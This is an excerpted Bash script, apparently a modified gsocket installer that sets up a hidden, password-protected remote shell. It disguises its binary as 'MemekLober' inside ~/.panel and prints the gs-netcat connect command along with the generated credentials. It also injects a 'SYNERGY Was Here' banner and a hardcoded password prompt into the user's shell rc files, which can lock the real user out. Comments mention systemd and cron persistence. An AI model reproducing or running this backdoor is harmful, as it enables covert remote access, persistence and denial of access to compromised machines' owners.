...
init_auth_password()
{
	if [[ -z "$GS_AUTH_PASSWORD" ]]; then
		# Generate random password
		if command -v openssl >/dev/null 2>&1; then
			GS_AUTH_PASSWORD="$(openssl rand -base64 16 | tr -d '/+=' | head -c 14)"
		elif command -v dd >/dev/null 2>&1; then
			GS_AUTH_PASSWORD="P@ss$(dd if=/dev/urandom bs=8 count=1 2>/dev/null | base64 | tr -d '/+=' | head -c 8)"
		else
			GS_AUTH_PASSWORD="Pass$(date +%s%N | sha256sum | base64 | head -c 10)"
		fi
	...
	# Set max attempts
	GS_AUTH_MAX_ATTEMPTS="${GS_AUTH_ATTEMPTS:-3}"
}
...
create_auth_wrapper()
{
	...
	cat > "$wrapper_path" << 'EOFAUTHWRAPPER'
#!/bin/bash
# GSocket Authentication Wrapper
# This script provides password authentication before shell access

PASS_HASH="HASH_TO_REPLACE"
MAX_ATTEMPTS=ATTEMPTS_TO_REPLACE
attempt=1
...
while [ $attempt -le $MAX_ATTEMPTS ]; do
    ...
    # Verify password
    user_hash="$(echo -n "$user_password" | sha256sum | cut -d' ' -f1)"
    
    if [ "$user_hash" == "$PASS_HASH" ]; then
...
echo "╚════════════════════════════════════════╝"
echo "Maximum authentication attempts exceeded."
echo "Connection will be closed."
sleep 3
exit 1
EOFAUTHWRAPPER

	# Replace placeholders with actual values
	sed -i "s/HASH_TO_REPLACE/$pass_hash/" "$wrapper_path"
	sed -i "s/ATTEMPTS_TO_REPLACE/$max_attempts/" "$wrapper_path"
...
display_auth_info()
{
	echo ""
	echo -e "${CG}╔══════════════════════════════════════════════════════════════╗${CN}"
	echo -e "${CG}║              AUTHENTICATION CREDENTIALS                      ║${CN}"
	echo -e "${CG}╠══════════════════════════════════════════════════════════════╣${CN}"
	echo -e "${CG}║${CN} GSocket Secret:  ${CY}${GS_SECRET}${CN}"
	echo -e "${CG}║${CN} Shell Password:  ${CY}${GS_AUTH_PASSWORD}${CN}"
	
	if [[ -n "$IS_AUTH_PASSWORD_GENERATED" ]]; then
		echo -e "${CG}║${CN} ${CR}⚠ Password was auto-generated - SAVE IT!${CN}"
	fi
	
	echo -e "${CG}╠══════════════════════════════════════════════════════════════╣${CN}"
	echo -e "${CG}║${CN} Connection Steps:${CN}"
	echo -e "${CG}║${CN} 1. Connect:  ${CC}gs-netcat -i -s \"${GS_SECRET}\"${CN}"
	echo -e "${CG}║${CN} 2. Enter password when prompted: ${CY}${GS_AUTH_PASSWORD}${CN}"
	echo -e "${CG}╚══════════════════════════════════════════════════════════════╝${CN}"
	echo ""
}
...
BIN_HIDDEN_NAME_DEFAULT="MemekLober"
...
init_dstbin()
{
	...
	[[ ! -d "${GS_PREFIX}${HOME}/.panel" ]] && xmkdir "${GS_PREFIX}${HOME}/.panel"
	try_dstdir "${GS_PREFIX}${HOME}/.panel/${CONFIG_DIR_NAME}" && return
...
echo -e "\e[1;33m[+] Installing SYNERGY Terminal Protection...\e[0m"

# Backup semua rc files yang akan dimodifikasi
...
# Kode Protection yang akan dimasukkan
PROTECTION_CODE=$(cat << 'EOV'
# =============================================
# SYNERGY Was Here
# =============================================
if [[ $- == *i* ]]; then
...
echo "  /$$  \ $$    | $$    | $$\  $$$| $$      | $$  \ $$| $$  \ $$    | $$    
echo " |  $$$$$$/    | $$    | $$ \  $$| $$$$$$$$| $$  | $$|  $$$$$$/    | $$    
echo "  \______/     |__/    |__/  \__/|________/|__/  |__/ \______/     |__/    
echo -e "\033[1;31m         \033[0m"
echo -e "\033[1;33m             ★ DIGITAL HAZARD ★\033[0m"
echo -e "\033[1;36m           SYNERGY ADVENTURE 1999\033[0m"
echo ""

    # =========================
    # PASSWORD PROTECTION
    # =========================
    TERM_PW="Synergy*Tech_V26"
    MAX_TRY=3
    COUNT=0

    while [ $COUNT -lt $MAX_TRY ]; do
        read -sp "[ACCESS REQUEST] Enter Password: " inputpw
        echo ""
        
        if [ "$inputpw" == "$TERM_PW" ]; then
            echo -e "\e[1;32m[+] ACCESS GRANTED. WELCOME ADMIN.\e[0m"
            echo ""
            break
        else
            COUNT=$((COUNT+1))
            echo -e "\e[1;31m[!] WRONG PASSWORD ($COUNT/$MAX_TRY)\e[0m"
        fi

        if [ $COUNT -eq $MAX_TRY ]; then
            echo -e "\e[1;31m[!] TOO MANY FAILED ATTEMPTS. EXITING...\e[0m"
            sleep 2
            exit 1
        fi
    done
...
# Masukkan protection ke semua rc files yang terdeteksi
for rc in "${RC_FN_LIST[@]}"; do
    if [[ -f ~/"$rc" ]]; then
        echo "$PROTECTION_CODE" >> ~/"$rc"
        echo -e "\e[1;32m[✓] Protection berhasil ditambahkan ke ~/$rc\e[0m"
    else
        # Buat file baru jika belum ada
        echo "$PROTECTION_CODE" > ~/"$rc"
        echo -e "\e[1;33m[✓] File ~/$rc dibuat dan protection ditambahkan\e[0m"
    fi
done

echo -e "\e[1;32m[✓] SYNERGY Terminal Protection installed successfully!\e[0m"

# Lanjutkan script asli (systemd, cron, dll)
...
uninstall()
{
	...
	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
			uninstall_rm "${GS_PREFIX}${HOME}/.panel/${cn}/${hn}"
			uninstall_rm "${GS_PREFIX}${HOME}/.panel/${cn}/${hn}.dat"  # SEC_NAME
		done
	...
	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
		uninstall_rmdir "${GS_PREFIX}${HOME}/.panel/${cn}"
	done
	uninstall_rmdir "${GS_PREFIX}${HOME}/.panel"
...
gs_start()
{
		# === MODIFIED: Create authentication wrapper first ===
	local auth_wrapper_path
	
	# Determine auth wrapper location
	if [[ -n "$CONFIG_DIR" ]] && [[ -d "$CONFIG_DIR" ]]; then
		auth_wrapper_path="$CONFIG_DIR/.gs-auth"
	else
		auth_wrapper_path="${TMPDIR}/.gs-auth-$$"
	fi
	
	# Create the authentication wrapper
	create_auth_wrapper "$auth_wrapper_path" "$GS_AUTH_PASSWORD_HASH" "$GS_AUTH_MAX_ATTEMPTS"
	# === END MODIFIED ===
...
# === ADDED: Initialize authentication password ===
init_auth_password
# === END ADDED ===
...
# === ADDED: Display authentication information ===
display_auth_info
# === END ADDED ===
...
echo -e "--> ${CW}Cukimay Ngana Tikung Tikung Baeee${CN}"
